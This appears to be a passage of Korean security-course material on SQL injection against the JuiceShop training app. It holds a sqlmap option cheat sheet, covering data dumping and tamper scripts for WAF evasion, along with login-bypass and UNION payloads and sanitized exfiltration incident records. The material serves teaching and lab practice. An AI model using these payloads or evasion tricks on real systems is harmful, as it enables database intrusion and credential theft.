| `--risk=1..3 --level=1..5` | 공격 폭 조절 | 철저한 검사 시 --level=3 |
| `--technique=BEUSTQ` | B)lind E)rror U)nion S)tacked T)ime Q)uery | 특정 기법만 |
| `--dbs` | DB 목록 | DB 탐색 |
| `--tables / -T 이름` | 테이블 목록 / 특정 테이블 | 스키마 확인 |
| `-C 컬럼명` | 특정 컬럼만 덤프 | email,password |
| `--dump` | 데이터 추출 | 최종 단계 |
| `--tamper=스크립트` | 페이로드 변형 | WAF 우회 |
| `--list-tampers` | 변형 스크립트 목록 | 참고용 |

**주요 tamper**

- `space2comment` — 공백 → `/**/`
- `between` — `>`/`<` → `BETWEEN ... AND ...`
- `charencode` — 전체 URL 인코딩
- `randomcase` — SQL 키워드 대소문자 혼용

### JuiceShop 취약 엔드포인트 (이번 주 대상)

| 엔드포인트 | 메서드 | 취약점 | 공략 |
|-----------|--------|--------|------|
| `/rest/user/login` | POST | 이메일 필드 SQLi | `' OR 1=1--` |
| `/rest/products/search?q=` | GET | 검색 파라미터 SQLi | UNION SELECT |
| `/api/Users/` | GET (Bearer) | admin 토큰으로 접근 | Week 06 연계 |

### Bastion API — 이번 주 사용 엔드포인트

| 메서드 | 경로 | 용도 |
|--------|------|------|
| POST | `/ask` | 자연어 SQLi 지시·결과 요약 |
| GET | `/evidence?limit=N` | 작업 기록 |

---

## 실제 사례 (WitFoo Precinct 6)

> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
> Sanitized — RFC5737 TEST-NET / ORG-NNNN / HOST-NNNN 으로 익명화됨.

### Case 1: `T1041` 패턴

```
src=100.64.4.210 dst=172.22.195.168 tech=T1041 mo_name=Data Theft
tactic=TA0010 (Exfiltration) suspicion=0.84
lifecycle=complete-mission
```

**해석**: 위 데이터는 실제 incident 의 sanitized 기록이다. `T1041` MITRE technique 의 행동 패턴이며, 본 강의의 학습 주제와 동일한 운영 맥락에서 발생한다.

### Case 2: `T1041` 패턴

```
src=172.22.36.156 dst=100.64.9.98 tech=T1041 mo_name=Data Theft
tactic=TA0010 (Exfiltration) suspicion=0.92
lifecycle=complete-mission
```

**해석**: 위 데이터는 실제 incident 의 sanitized 기록이다. `T1041` MITRE technique 의 행동 패턴이며, 본 강의의 학습 주제와 동일한 운영 맥락에서 발생한다.

